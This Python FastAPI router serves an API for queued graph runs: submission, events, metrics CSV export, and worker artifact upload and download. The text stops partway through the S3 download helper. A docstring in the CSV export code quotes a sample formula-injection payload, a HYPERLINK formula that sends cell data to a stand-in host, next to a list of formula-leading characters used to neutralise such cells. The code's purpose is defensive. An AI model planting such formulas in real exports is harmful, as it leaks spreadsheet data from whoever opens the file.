"""REST surface for server-owned graph runs (#120).

Eight endpoints over ``RunService`` + ``RunStore``; no execution logic lives
here. The point of the surface is that a run's lifetime is no longer tied to
any connection: submit from one client, close it, and query status, events
and metrics from another.

    POST   /api/runs                     submit  -> {run_id, status}
    POST   /api/runs/estimate            default memory budget for a graph (#788)
    GET    /api/runs                     list (newest first, + queue position)
    GET    /api/runs/{id}                one row + last event cursor + environment
    DELETE /api/runs/{id}                drop a FINISHED run and its children
    POST   /api/runs/{id}/cancel         cooperative stop
    GET    /api/runs/{id}/events         replay after a cursor, optional long poll
    GET    /api/runs/{id}/metrics        series as JSON or CSV
    GET    /api/runs/{id}/artifacts      checkpoints and other recorded files
    POST   /api/runs/{id}/artifacts/upload          a worker's output (#785)
    GET    /api/runs/{id}/artifacts/{aid}/download  an uploaded output (#785, #791)

The upload route is the one POST here that does not take the session token
alone: a worker agent (#785, the ``transfer`` storage backend) sends its
worker token, so ``auth_guard`` lets the path through and the route checks
the token itself (:func:`_uploader`).

Auth follows the house rule in ``main.py`` exactly: ``auth_guard`` requires
the session token for the two mutating routes (POST), reads are open like
every other GET in the app. This router is deliberately NOT added to
``_AUTH_EXEMPT_PREFIXES`` — the exemption exists for ``/api/apps`` and
``/api/keys``, which carry per-route dependencies instead; a run route
gaining an exemption without one would silently drop authentication (which
is what ``test_auth_drift.py`` guards for those two, and what
``test_api_runs.test_runs_routes_are_not_under_an_auth_exempt_prefix``
guards here).

Errors: 400 for a malformed submit or an unknown status filter, 404 for an
unknown run, 413 for a submit over ``MAX_RUN_BODY_BYTES``, 503 when the
service is not on ``app.state`` (the ``routes_execution_outputs._get_store``
precedent — the lifespan does not run under httpx's ASGITransport). All of
them answer ``{"detail": ...}``; the 9-key run envelope belongs to
``routes_graph_run`` / ``routes_apps``, not here.
"""

from __future__ import annotations

import asyncio
import csv
import io
import json
import logging
from dataclasses import asdict
from pathlib import Path
from typing import Any

from fastapi import APIRouter, HTTPException, Query, Request
from fastapi.exceptions import RequestValidationError
from fastapi.responses import (
    FileResponse,
    RedirectResponse,
    Response,
    StreamingResponse,
)
from pydantic import BaseModel, ValidationError

from ..config import settings
from ..core import memory_admission as mem
from ..core.auth import TOKEN_HEADER, constant_time_equals, session_token
from ..core.run_service import (
    RunService,
    RunServiceUnavailable,
    RunSubmitError,
    json_size,
)
from ..core.run_store import (
    RUN_STATUSES,
    STATUS_QUEUED,
    EventRecord,
    MetricRecord,
    RunRecord,
)

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/runs", tags=["runs"])

#: Upper bound for one queue-position sweep. Deeper than this and a run's
#: exact rank stops being actionable; scanning the whole table on every poll
#: of the Runs panel to produce it never was.
_QUEUE_SCAN_LIMIT = 1000

_CSV_COLUMNS = ("run_id", "node_id", "name", "step", "value", "ts")


def _get_service(request: Request) -> RunService:
    service = getattr(request.app.state, "run_service", None)
    if service is None:
        raise HTTPException(status_code=503,
                            detail="run service not initialised")
    return service


class SubmitRunRequest(BaseModel):
    """``{graph, options, name}``.

    ``graph`` is typed only as an object here; its shape is checked by
    ``normalize_graph`` so the envelope rules live in ONE place next to the
    service that enforces them, and pydantic never has to mirror them.
    """

    graph: dict[str, Any]
    options: Any = None
    name: str | None = None


async def _read_submit_body(request: Request) -> SubmitRunRequest:
    """Read and validate the submit body by hand, keeping FastAPI's 422.

    The body cap that used to sit in front of this read is gone. It compared
    ``Content-Length`` to ``MAX_RUN_BODY_BYTES`` and was advisory — a chunked
    request declares no length and was never measured at all — so it is
    replaced by ``core.body_limit``, which counts the bytes as they arrive and
    covers every route rather than the three that remembered to ask (core#265).
    The cap still matters most here: every submit writes an immutable
    ``graph_snapshot`` row, a queued run never reaches a terminal state, and
    keep-last-N retention only prunes finished runs
    (``RUN_RETENTION_KEEP_LAST``), so nothing else reclaims an oversized submit.

    The hand-parse stays. It no longer buys the cap anything — the middleware
    refuses inside ``request.body()`` whoever calls it — but it is what keeps
    this route's 422 identical to a declared pydantic body's: both failure
    modes are re-raised as ``RequestValidationError`` with the same ``loc``
    prefix FastAPI applies (``("body", ...)``) and ``include_url=False``.
    """
    raw = await request.body()
    try:
        payload = json.loads(raw)
    except json.JSONDecodeError as exc:
        raise RequestValidationError([{
            "type": "json_invalid",
            "loc": ("body", exc.pos),
            "msg": "JSON decode error",
            "input": {},
            "ctx": {"error": exc.msg},
        }], body=raw)
    try:
        return SubmitRunRequest.model_validate(payload)
    except ValidationError as exc:
        raise RequestValidationError(
            [
                {**err, "loc": ("body", *err.get("loc", ()))}
                for err in exc.errors(include_url=False)
            ],
            body=payload,
        )


async def _queue_positions(service: RunService,
                           records: list[RunRecord]) -> dict[str, int]:
    """1-based position of each QUEUED run WITHIN ITS OWN DEVICE QUEUE.

    Per ``queue_key``, not global, because that is what the scheduler is
    (#123): a CPU run behind two other CPU runs is third in line even when
    six CUDA runs were submitted before it, and a global rank would tell it
    "position 9" for a queue it is not in.

    Computed from the ROWS rather than asked of the in-memory scheduler, and
    that is deliberate. The two agree by construction — a run is enqueued in
    submit order, and ``created_at, rowid`` IS submit order — while the rows
    also cover what the scheduler cannot see: a ``queued`` orphan left by a
    process that died before ``recover_interrupted`` ran still gets an
    honest place in line instead of a null.

    Costs one extra indexed query per request, and only when a queued row is
    actually present — nothing to pay while the queues are empty, which is
    the common case, and one bounded scan when the Runs panel is polling a
    backlog.

    Past ``_QUEUE_SCAN_LIMIT`` the answer is ``None`` for everyone rather
    than a number. ``list_runs`` is NEWEST-first, so a truncated scan drops
    the OLDEST rows — the ones actually at the front — and every position
    computed from what is left would be confidently too small. "We cannot
    say" is the honest answer; a wrong rank is worse than no rank.
    """
    if not any(record.status == STATUS_QUEUED for record in records):
        return {}
    queued = await service.store.list_runs(status=STATUS_QUEUED,
                                           limit=_QUEUE_SCAN_LIMIT)
    if len(queued) >= _QUEUE_SCAN_LIMIT:
        return {}
    # list_runs is newest-first; a queue is served oldest-first.
    depth: dict[str | None, int] = {}
    positions: dict[str, int] = {}
    for record in reversed(queued):
        depth[record.queue_key] = depth.get(record.queue_key, 0) + 1
        positions[record.id] = depth[record.queue_key]
    return positions


def _run_payload(record: RunRecord, *, queue_position: int | None,
                 active: bool, last_cursor: int | None = None,
                 queue_reason: str | None = None,
                 final_metrics: dict[str, float] | None = None,
                 metric_producers: dict[str, list[str | None]] | None = None,
                 worker_status: dict[str, Any] | None = None,
                 ) -> dict[str, Any]:
    payload = asdict(record)
    # Where an active worker run's worker stands (#783): connected, or
    # disconnected since ``disconnected_at`` (Unix seconds) and waiting for
    # it until ``resume_deadline``. None for every other run.
    payload["worker_status"] = worker_status
    payload["queue_position"] = queue_position
    # Why a queued run is not starting beyond its place in line (#772):
    # "waiting for worker X to reconnect". None otherwise.
    payload["queue_reason"] = queue_reason
    payload["active"] = active
    payload["final_metrics"] = final_metrics or {}
    payload["metric_producers"] = metric_producers or {}
    if last_cursor is not None:
        payload["last_cursor"] = last_cursor
    return payload


def _event_payload(event: EventRecord) -> dict[str, Any]:
    # ``run_id`` is dropped: it is already on the envelope, and repeating it
    # on every event is pure weight on a replay of thousands.
    return {"cursor": event.cursor, "type": event.type,
            "payload": event.payload, "ts": event.ts}


def _bounded_events(events: list[EventRecord]) -> list[dict[str, Any]]:
    """Serialise events up to the response byte budget, in cursor order.

    Always yields at least one event so an oversized single event can never
    wedge a follower's cursor. Costs one size measurement per event on the
    read path; /events is polled far less often than events are produced,
    and the alternative — trusting ``limit`` alone — makes the response size
    a product of two independently-configured numbers.

    The budget is read from ``settings`` per call rather than captured in a
    module constant, so ``CODEFYUI_RUN_EVENTS_RESPONSE_CAP_BYTES`` actually
    reaches it — the previous literal here could not be configured at all.
    """
    cap_bytes = settings.RUN_EVENTS_RESPONSE_CAP_BYTES
    out: list[dict[str, Any]] = []
    total = 0
    for event in events:
        total += json_size(event.payload)
        if out and total > cap_bytes:
            break
        out.append(_event_payload(event))
    return out


async def _require_run(service: RunService, run_id: str) -> RunRecord:
    record = await service.store.get_run(run_id)
    if record is None:
        raise HTTPException(status_code=404, detail=f"run '{run_id}' not found")
    return record


@router.post("", openapi_extra={
    # Hand-parsing the body takes it out of the generated schema, and an
    # endpoint whose /docs page shows no request body is worse documentation
    # than the cap is worth. Re-declare the same model, inlined because
    # nothing references the component any more.
    "requestBody": {
        "required": True,
        "content": {
            "application/json": {
                "schema": SubmitRunRequest.model_json_schema(),
            },
        },
    },
})
async def submit_run(request: Request):
    """Persist and schedule a run. Returns as soon as it is scheduled.

    Deliberately does NOT wait for the run: that is the entire point of the
    endpoint. Progress is read back through ``/events`` (long-pollable) and
    the row itself.

    ``status`` is ``running`` or ``queued`` — the latter when the run's
    device is already at its concurrency limit and the run joined that
    device's FIFO (#123). Poll the row, or long-poll ``/events``, either
    way; a queued run parks the long poll properly instead of returning
    empty pages.

    The run's device is ``options.device`` when the key is present, else
    the graph's ``settings.device``, else ``cpu``. ``auto`` resolves to the
    best accelerator this server has. The resolved device is the row's
    ``queue_key`` and the device the run executes on.

    ``options.target`` (#769) is ``{"worker": "local", "devices": [...]}``.
    Only ``local`` is accepted until remote workers exist; ``devices[0]`` is
    the effective device when ``device`` is absent, and a ``device`` that
    disagrees is a 400. The row reports ``worker_id`` and ``devices``.

    The body is parsed here rather than declared as a pydantic parameter —
    see ``_read_submit_body``. Its size ceiling is enforced by
    ``core.body_limit`` for every route, not by this one.
    """
    body = await _read_submit_body(request)
    service = _get_service(request)
    try:
        result = await service.submit(body.graph, options=body.options,
                                      name=body.name)
    except RunSubmitError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    except RunServiceUnavailable as exc:
        raise HTTPException(status_code=503, detail=str(exc))
    return {"run_id": result.run_id, "status": result.status}


class EstimateRequest(BaseModel):
    """``{graph}``: the graph a run would submit."""

    graph: dict[str, Any]
    #: The run's ``device`` and ``target.devices`` (#788): the history is per
    #: device kind and count. Absent: one CPU, which has no history.
    options: dict[str, Any] | None = None


@router.post("/estimate")
async def estimate_memory(body: EstimateRequest, request: Request
                          ) -> dict[str, Any]:
    """The memory budget a run of *graph* would get by default (#788).

    ``{"suggested_gib", "source", "peak_bytes", "from_run"}``: the last
    peak of a succeeded run of the same graph times 1.2 (``source:
    "history"``), or all null when there is none. What the Queue on...
    dialog offers as ``target.memory_gib`` for a shared card; #794 adds a
    static estimate. 400 for a malformed graph.
    """
    service = _get_service(request)
    try:
        suggestion = await service.suggest_memory(body.graph, body.options)
    except RunSubmitError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    if suggestion is None:
        return {"suggested_gib": None, "source": None, "peak_bytes": None,
                "from_run": None}
    budget = suggestion.budget
    return {"suggested_gib": round(budget.bytes / mem.GIB, 2),
            "source": budget.source, "peak_bytes": suggestion.peak_bytes,
            "from_run": budget.from_run}


@router.get("")
async def list_runs(
    request: Request,
    status: list[str] | None = Query(default=None),
    limit: int = Query(default=50, ge=1, le=500),
    offset: int = Query(default=0, ge=0),
):
    """Newest first. ``?status=`` repeats (``?status=queued&status=running``).

    ``total`` is the unpaged count so a table can size itself without
    walking every page.

    Each row also carries ``final_metrics`` — the last value of every series
    the run recorded (#124). One grouped query for the whole page, so the
    Runs table can print a final loss per row without a metrics request per
    row; ``{}`` for a run that recorded nothing.

    And ``metric_producers`` — ``{series name: [node ids that logged it]}``,
    ``null`` for the run-level series (#641). ``final_metrics`` collapses a
    name several nodes log into one number; this is what keeps them apart,
    so a sweep objective can be chosen by node and metric from evidence.
    """
    service = _get_service(request)
    # Validate the CLIENT's input here rather than catching ValueError off
    # the store call: the store raises the same exception type for a corrupt
    # `options` column, and blaming the caller with a 400 for the server's
    # own bad row would send whoever debugs it in exactly the wrong
    # direction. A corrupt row now surfaces as the 500 it is.
    if status is not None:
        unknown = sorted(set(status) - RUN_STATUSES)
        if unknown:
            raise HTTPException(
                status_code=400,
                detail=f"unknown run status {unknown}; expected one of "
                       f"{sorted(RUN_STATUSES)}")
    records = await service.store.list_runs(status=status, limit=limit,
                                            offset=offset)
    total = await service.store.count_runs(status=status)
    positions = await _queue_positions(service, records)
    finals = await service.store.latest_metrics([r.id for r in records])
    producers = await service.store.metric_producers_by_run(
        [r.id for r in records])
    return {
        "runs": [
            _run_payload(record,
                         queue_position=positions.get(record.id),
                         queue_reason=service.queue_reason(record.id),
                         active=service.is_active(record.id),
                         final_metrics=finals.get(record.id),
                         metric_producers=producers.get(record.id),
                         worker_status=service.worker_status(record.id))
            for record in records
        ],
        "total": total,
        "limit": limit,
        "offset": offset,
    }


@router.get("/{run_id}")
async def get_run(run_id: str, request: Request):
    """One row plus ``last_cursor`` — where an event follower should start.

    Also ``fingerprint``: the environment document ``fingerprint_digest``
    names (#344), or null for a run that has not started or started before
    the server recorded one. Only here, not on the list: a list row carries
    the digest and the small ``execution_facts``, and a poll of fifty rows
    must not ship fifty copies of the same few kilobytes.
    """
    service = _get_service(request)
    record = await _require_run(service, run_id)
    positions = await _queue_positions(service, [record])
    finals = await service.store.latest_metrics([record.id])
    producers = await service.store.metric_producers_by_run([record.id])
    payload = _run_payload(
        record,
        queue_position=positions.get(record.id),
        queue_reason=service.queue_reason(record.id),
        active=service.is_active(run_id),
        last_cursor=await service.store.latest_cursor(run_id),
        final_metrics=finals.get(record.id),
        metric_producers=producers.get(record.id),
        worker_status=service.worker_status(run_id),
    )
    # How the run ended on its worker after it had ended here (#783),
    # ``{status, error, worker_id, at}``, or None.
    facts = record.execution_facts if isinstance(
        record.execution_facts, dict) else {}
    payload["late_result"] = facts.get("late_result")
    payload["fingerprint"] = (
        None if record.fingerprint_digest is None
        else await service.store.get_fingerprint(record.fingerprint_digest))
    return payload


@router.delete("/{run_id}")
async def delete_run(run_id: str, request: Request):
    """Drop a FINISHED run; its metrics, events and artifacts cascade.

    Refuses a queued or running row with a 409. That is the same policy
    ``RunStore.prune`` already encodes ("active runs are never deleted"), and
    it is checked against the SERVICE rather than the row's ``status``
    string: the row is the slower of the two: a run cancelled a millisecond
    ago is still ``running`` in SQL while its task deregisters, and a queued
    run's place in the FIFO lives only in memory. Deleting either would
    leave the scheduler holding a handle to a row that no longer exists.

    ``deleted`` is always True here — a run that was never there is a 404,
    not a quiet success, because the Runs panel showed the user a row and
    "it was already gone" is information they should see.

    Artifact FILES are left on disk, exactly as ``RunStore.delete_run`` says:
    a checkpoint is the user's, not the run log's, and this endpoint is
    history cleanup rather than a delete-my-weights button.

    The exception is a worker run's own directory (#785,
    ``<data root>/runs/<run_id>``): what the worker uploaded for the run
    has no index but these rows, so it goes with them. A writer node's file
    a worker placed in this server's data folders stays, as a local run's.
    The same holds for a run's objects in the S3 bucket (#791,
    ``runs/<run_id>/``): they go, but the writer nodes' ``output/``.

    Captured OUTPUTS are a different matter and DO go: ``RunOutputStore``
    keys its in-memory tensors by the same run id, so leaving them behind
    would keep a deleted run's activations resident until its LRU slot was
    reused — and ``/api/execution/outputs`` would keep serving them for a
    run that answers 404 everywhere else.
    """
    service = _get_service(request)
    record = await _require_run(service, run_id)
    if service.is_active(run_id) or service.is_queued(run_id):
        raise HTTPException(
            status_code=409,
            detail=f"run '{run_id}' is queued or running; cancel it first")
    # Read before the rows cascade away: where the run wrote in an S3
    # bucket (#791), whose objects then go with it.
    s3_rows = await service.store.s3_objects(run_id)
    deleted = await service.store.delete_run(run_id)
    if not deleted:
        # The row existed at _require_run and is gone now: another client
        # deleted it in between. Same answer as if we had lost the race by a
        # little more, which is what a 404 already means here.
        raise HTTPException(status_code=404, detail=f"run '{run_id}' not found")
    outputs = getattr(request.app.state, "run_output_store", None)
    if outputs is not None:
        await outputs.delete_run(run_id)
    from ..core.run_store import WORKER_ANY, WORKER_LOCAL
    from ..core.transfer import remove_run_files

    if record.worker_id not in (WORKER_LOCAL, WORKER_ANY):
        # What a worker uploaded for the run (#785) has no other index.
        await asyncio.to_thread(remove_run_files, run_id)
    answer: dict[str, Any] = {"run_id": run_id, "deleted": True}
    if s3_rows:
        # As retention does (#791): the run's objects but a writer node's
        # files (``output/``), from the bucket and prefix the rows
        # recorded. Never fails the delete (the rows are gone); what stays
        # is logged and said in ``warning``.
        warning = await _remove_s3_objects(run_id, s3_rows)
        if warning is not None:
            answer["warning"] = warning
    return answer


async def _remove_s3_objects(run_id: str, rows: list[Any]) -> str | None:
    """Remove a deleted run's S3 objects (#791); why some stay, or None."""
    from ..core import s3

    reason = None
    places = [(r, False, bucket, prefix)
              for r, bucket, prefix in s3.locations(rows)]
    if not s3.client_available():
        reason = s3.unconfigured() or "boto3 is not installed"
    elif not places:
        reason = "CODEFYUI_S3_BUCKET is not set"
    else:
        _, failed = await asyncio.to_thread(s3.remove_runs_objects, places)
        if failed:
            return "the run's files in the S3 bucket stay: " + "; ".join(failed)
    if reason is None:
        return None
    logger.warning("run %s deleted, but its S3 objects stay: %s", run_id,
                   reason)
    return f"the run's files in the S3 bucket stay: {reason}"


@router.post("/{run_id}/cancel")
async def cancel_run(run_id: str, request: Request):
    """Ask a run to stop; cooperative, so ``status`` may still say running.

    ``cancelled`` reports whether the request did anything: False for a run
    that had already finished. Both are 200 — asking twice is not an error,
    and a cancel that raced a completion is normal (the user hits Stop as
    the last epoch lands).
    """
    service = _get_service(request)
    outcome = await service.cancel(run_id)
    if outcome is None:
        raise HTTPException(status_code=404, detail=f"run '{run_id}' not found")
    return {"run_id": outcome.run_id, "status": outcome.status,
            "cancelled": outcome.cancelled}


@router.get("/{run_id}/events")
async def get_run_events(
    run_id: str,
    request: Request,
    cursor: int = Query(default=0, ge=0),
    wait: float = Query(default=0.0, ge=0.0, le=60.0),
    limit: int = Query(default=500, ge=1, le=2000),
):
    """Events strictly after *cursor*, oldest first.

    ``wait`` seconds of long polling when the tail is empty: the request
    sleeps on an in-process wake-up (never a retry loop) and returns the
    moment an event lands, the run ends, or the deadline passes — whichever
    comes first, so a finished run answers immediately regardless of
    ``wait``. The returned ``cursor`` is where to resume, and never moves
    backwards on an empty page.

    A page can come back SHORTER than ``limit`` even when more events exist:
    the response also has a byte budget. Resume from ``cursor`` — which is
    what a follower does anyway — and the next page continues.
    """
    service = _get_service(request)
    record = await _require_run(service, run_id)
    events = await service.wait_for_events(run_id, after_cursor=cursor,
                                           limit=limit, wait=wait)
    if wait > 0:
        # The status may well have changed while we were parked.
        record = await service.store.get_run(run_id) or record
    page = _bounded_events(events)
    return {
        "run_id": run_id,
        "status": record.status,
        "active": service.is_active(run_id),
        "events": page,
        # The cursor tracks what was actually RETURNED, not what was read:
        # a byte-budgeted short page must not tell a follower to skip the
        # events it did not receive.
        "cursor": page[-1]["cursor"] if page else cursor,
    }


#: Characters a spreadsheet reads as "this cell is a formula" when they lead
#: the cell. Tab and CR are in here because Excel strips them first and then
#: reads what follows, so ``\t=cmd`` is a formula wearing a disguise.
_CSV_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")

#: U+FEFF, prepended to the body. ``text/csv; charset=utf-8`` is not enough
#: for Excel on Windows, which reads a BOM-less CSV in the ANSI codepage and
#: mangles every non-ASCII metric or node name -- in a product that ships a
#: zh-TW locale. Every other reader (pandas, LibreOffice, Sheets, ``csv``
#: opened as ``utf-8-sig``) skips it. Spelled ``chr`` rather than pasted:
#: the character is invisible in an editor, which is how it gets lost.
_CSV_BOM = chr(0xFEFF)


def _csv_text_cell(value: Any) -> str:
    """One TEXT cell, neutralised against formula injection.

    ``csv.writer`` quotes commas, quotes and embedded newlines correctly,
    but quoting is not what stops a formula: Excel, LibreOffice and Sheets
    EVALUATE a cell whose first character is one of
    :data:`_CSV_FORMULA_LEADERS`, so a metric named
    ``=HYPERLINK("http://x/?"&A1,"loss")`` fires when the file is opened.

    Two of the six columns are user-influenced. ``name`` is whatever a
    plugin or custom node computes -- ``invoke_node`` hands any node
    declaring ``context`` the full ``ExecutionContext``, so
    ``context.log_metric(name, ...)`` takes an arbitrary string. ``node_id``
    comes off the graph JSON verbatim. The shipped training nodes only ever
    pass literals, and the canvas script namespace has no ``log_metric`` at
    all, so plugins and custom nodes are the live route.

    A leading apostrophe is the convention every spreadsheet understands as
    "this is text". It costs one visible character in the pathological case
    and nothing in the normal one.

    Numeric columns are deliberately NOT routed through here: a negative
    value leads with ``-`` by nature, and quoting it would turn the value
    column into text and break every chart built on the export.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_CSV_FORMULA_LEADERS) else text


def _metrics_csv(run_id: str, metrics: list[MetricRecord]) -> str:
    buffer = io.StringIO(newline="")
    # Explicit lineterminator: csv defaults to \r\n, and the module's own
    # newline="" contract means that would survive verbatim into the body.
    writer = csv.writer(buffer, lineterminator="\n")
    writer.writerow(_CSV_COLUMNS)
    for point in metrics:
        writer.writerow([
            _csv_text_cell(point.run_id),
            _csv_text_cell(point.node_id or ""),
            _csv_text_cell(point.name),
            point.step,
            # A non-finite value is stored as NULL (a diverged loss); an
            # EMPTY cell is what every spreadsheet reads as a gap, whereas
            # "None" would read as text and poison the column's type.
            "" if point.value is None else point.value,
            point.ts,
        ])
    return _CSV_BOM + buffer.getvalue()


def _csv_filename(run_id: str) -> str:
    """A filename that cannot break out of the header.

    Run ids are our own uuid4 hex, but this endpoint's id comes off the URL,
    so the value is whitelisted rather than trusted.
    """
    safe = "".join(c for c in run_id if c.isalnum() or c in "-_")[:64]
    return f"run-{safe}-metrics.csv" if safe else "run-metrics.csv"


@router.get("/{run_id}/metrics")
async def get_run_metrics(
    run_id: str,
    request: Request,
    name: str | None = Query(default=None),
    format: str = Query(default="json", pattern="^(json|csv)$"),
):
    """Recorded scalar series, ordered ``(name, step)`` — chart order.

    ``format=csv`` returns a download for spreadsheet/pandas use; the JSON
    form additionally lists every series name so a legend can be built
    without scanning the points.
    """
    service = _get_service(request)
    await _require_run(service, run_id)
    metrics = await service.store.get_metrics(run_id, name=name)
    if format == "csv":
        return Response(
            content=_metrics_csv(run_id, metrics),
            media_type="text/csv; charset=utf-8",
            headers={"Content-Disposition":
                     f'attachment; filename="{_csv_filename(run_id)}"'},
        )
    return {
        "run_id": run_id,
        "names": await service.store.list_metric_names(run_id),
        "metrics": [
            {"node_id": point.node_id, "name": point.name, "step": point.step,
             "value": point.value, "ts": point.ts}
            for point in metrics
        ],
    }


@router.get("/{run_id}/artifacts")
async def get_run_artifacts(
    run_id: str,
    request: Request,
    kind: str | None = Query(default=None),
):
    """Files the run recorded — checkpoints, exports, images — oldest first.

    ``exec_run_artifacts`` rows also ride the event log as ``artifact``
    events, and until now that was the only way to reach them. Mining the
    log works for a client that watched the whole run and nothing else: the
    Runs panel opens on a run it did NOT watch, and tailing a long run's
    events to find three checkpoints means replaying thousands of node
    statuses to reconstruct a list the store can answer in one indexed read.

    ``kind`` is not validated against a whitelist — the vocabulary is open
    by design (``ARTIFACT_KIND_*`` are conveniences, not a constraint), so
    an unknown kind is an empty list rather than a 400.

    ``path`` is where the file is on this server. A file a worker wrote
    under a shared mount (#782) is stored relative to it and reported here
    translated: ``backend`` is ``mount``, ``mount_label`` names the mount
    and ``relative_path`` is the stored path. A file a worker uploaded is
    ``transfer`` (#785: ``path`` on this server) or ``s3`` (#791: ``path``
    is its ``s3://<bucket>/<key>`` URI, ``relative_path`` the key and
    ``bucket`` the bucket; ``bucket`` is null on every other row). Every
    other row is ``local`` with its absolute path and no ``relative_path``. ``worker_id`` names
    the worker whose run wrote the file (``local``: this server).
    """
    service = _get_service(request)
    await _require_run(service, run_id)
    artifacts = await service.store.list_artifacts(run_id, kind=kind)
    return {
        "run_id": run_id,
        "artifacts": [
            {"id": record.id, "kind": record.kind, "path": record.path,
             "meta": record.meta, "created_at": record.created_at,
             "backend": record.backend, "mount_label": record.mount_label,
             "worker_id": record.worker_id, "bucket": record.bucket,
             "relative_path": (record.stored_path
                               if record.backend in ("mount", "transfer",
                                                     "s3")
                               else None)}
            for record in artifacts
        ],
    }


# ── the transfer backend (#785) ────────────────────────────────────────────



async def _uploader(request: Request) -> str | None:
    """Who may upload: ``None`` for the session token (any worker run), a
    worker's name for its worker token; 403 for anything else."""
    provided = request.headers.get(TOKEN_HEADER)
    if constant_time_equals(provided, session_token()):
        return None
    store = getattr(request.app.state, "worker_store", None)
    name = None if store is None else await store.authenticate(provided)
    if name is None:
        raise HTTPException(status_code=403,
                            detail=f"Missing or invalid {TOKEN_HEADER} header")
    return name


@router.post("/{run_id}/artifacts/upload")
async def upload_run_artifact(run_id: str, request: Request):
    """Receive a file a worker run wrote (#785, the ``transfer`` backend).

    Multipart, form fields first: ``kind`` (the artifact kind), ``name`` (a
    relative path; each part is made a safe file name), ``place`` (``run``,
    the default, or ``data``) and optionally ``sha256``, then ``file``. The
    body is streamed to a temporary file of its own beside its destination
    (``core.transfer.Receiver``: no second spool), capped by
    ``MAX_UPLOAD_SIZE`` (413) and hashed as it arrives, then moved into
    place (``core.transfer.place_file``): ``run`` at
    ``<data root>/runs/<run_id>/<kind>/<name>`` (``core.transfer.run_key``:
    one name, one key), where the same name again replaces its file;
    ``data`` (a writer node's file) at the same relative path in this
    server's own data folders, never over a different file (the newer one
    is suffixed; the same content is the same file). A path this server
    cannot hold (its path limit) is refused with 400. The answer's ``path``
    is the key, which the worker then reports in its ``artifact`` frame
    (that is what records the row, in the run's event order). Uploading the
    same content again answers 200 with the same key.

    Only for a run executing on a worker now, and with a worker token only
    for a run on THAT worker (409 otherwise); the session token may upload
    for any worker run. Authenticated before a byte of the body is read.
    """
    from ..core import transfer

    service = _get_service(request)
    worker = await _uploader(request)
    running_on = service.running_on(run_id)
    if running_on is None or (worker is not None and running_on != worker):
        raise HTTPException(status_code=409, detail=(
            f"run '{run_id}' is not running on "
            f"{'a worker' if worker is None else f'worker {worker}'}"))

    def destination_dir(fields: dict[str, str]) -> Path:
        place = fields.get("place") or transfer.PLACE_RUN
        if place == transfer.PLACE_RUN:
            return transfer.run_files_dir(run_id)
        if place != transfer.PLACE_DATA:
            raise ValueError(f"unknown place {place!r}")
        relative = transfer.clean_name(fields.get("name") or "")
        location = transfer.key_location(relative.as_posix())
        if location is None or relative.parts[0] not in transfer.DATA_PLACES:
            raise ValueError(f"{relative} is not under "
                             f"{', '.join(transfer.DATA_PLACES)}")
        return location.parent

    try:
        receiver = transfer.Receiver(request.headers.get("content-type", ""),
                                     destination_dir, settings.MAX_UPLOAD_SIZE)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from None
    try:
        pending = bytearray()
        try:
            async for chunk in request.stream():
                pending += chunk
                if len(pending) >= transfer.CHUNK:
                    await asyncio.to_thread(receiver.write, bytes(pending))
                    pending.clear()
            await asyncio.to_thread(receiver.write, bytes(pending))
            await asyncio.to_thread(receiver.close)
        except OverflowError:
            raise HTTPException(status_code=413,
                                detail="File too large") from None
        except (ValueError, OSError) as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from None
        fields = receiver.fields
        if not receiver.got_file or not fields.get("kind") \
                or not fields.get("name"):
            raise HTTPException(status_code=400, detail=(
                "expected multipart kind, name, then file"))
        expected = (fields.get("sha256") or "").lower() or None
        if expected is not None and expected != receiver.sha256:
            raise HTTPException(status_code=400, detail=(
                f"sha256 mismatch: received {receiver.sha256}, "
                f"expected {expected}"))
        try:
            key = await asyncio.to_thread(
                transfer.place_file, receiver.tmp,
                fields.get("place") or transfer.PLACE_RUN, run_id,
                fields["kind"], fields["name"], receiver.sha256)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from None
    finally:
        await asyncio.to_thread(receiver.discard)
    return {"path": key, "bytes": receiver.size, "sha256": receiver.sha256}


@router.get("/{run_id}/artifacts/{artifact_id}/download")
async def download_run_artifact(run_id: str, artifact_id: int,
                                request: Request):
    """Download a file a worker uploaded for the run (#785, #791).

    Only ``transfer`` rows: their file is under this run's own directory,
    which a worker cannot point anywhere else. Any other row names a path
    a node or a plugin wrote, which this open read must not serve (400).
    A TensorBoard directory is not a file (400): point TensorBoard at the
    row's ``path`` instead.

    And ``s3`` rows (#791), whose key is under the run's own prefix:
    streamed from the bucket through this server, or, with
    ``CODEFYUI_S3_DOWNLOAD=presign``, a 307 to a pre-signed URL the browser
    fetches from the bucket itself. 503 when the bucket cannot be reached.
    """
    from ..core import transfer

    service = _get_service(request)
    await _require_run(service, run_id)
    records = await service.store.list_artifacts(run_id)
    record = next((r for r in records if r.id == artifact_id), None)
    if record is None:
        raise HTTPException(status_code=404,
                            detail=f"artifact {artifact_id} not found")
    if record.backend == "s3":
        return await _download_s3(run_id, record.stored_path or "",
                                  record.bucket)
    if record.backend != "transfer":
        raise HTTPException(status_code=400, detail=(
            "only files a worker uploaded can be downloaded here; this one "
            "is at its path"))
    path = transfer.key_path(run_id, record.stored_path or "")
    if path is None or not path.exists():
        raise HTTPException(status_code=404, detail="the file is gone")
    if not path.is_file():
        raise HTTPException(status_code=400, detail="not a file (a directory)")
    return FileResponse(path=path, filename=path.name,
                        media_type="application/octet-stream")


async def _download_s3(run_id: str, key: str, bucket: str | None) -> Response:
    """Serve one of *run_id*'s objects in the S3 bucket (#791): *bucket*
    and the key's prefix are the ones the row recorded."""
    from ..core import s3

    if not s3.owns_key(run_id, key):
        raise HTTPException(status_code=404, detail="the file is gone")
    bucket = bucket or settings.S3_BUCKET
    reason = None
    if not s3.client_available():
        reason = s3.unconfigured() or "boto3 is not installed"
    elif not bucket:
        reason = "CODEFYUI_S3_BUCKET is not set"
    if reason is not None:
        raise HTTPException(status_code=503, detail=(
            f"the run's file is in an S3 bucket this server cannot reach: "
            f"{reason}"))
    name = s3.filename(key)
    try:
        head = await asyncio.to_thread(s3.head, key, bucket)
        if head is None:
            if await asyncio.to_thread(s3.is_folder, key, bucket):
                raise HTTPException(status_code=400,
                                    detail="not a file (a directory)")
            raise HTTPException(status_code=404, detail="the file is gone")
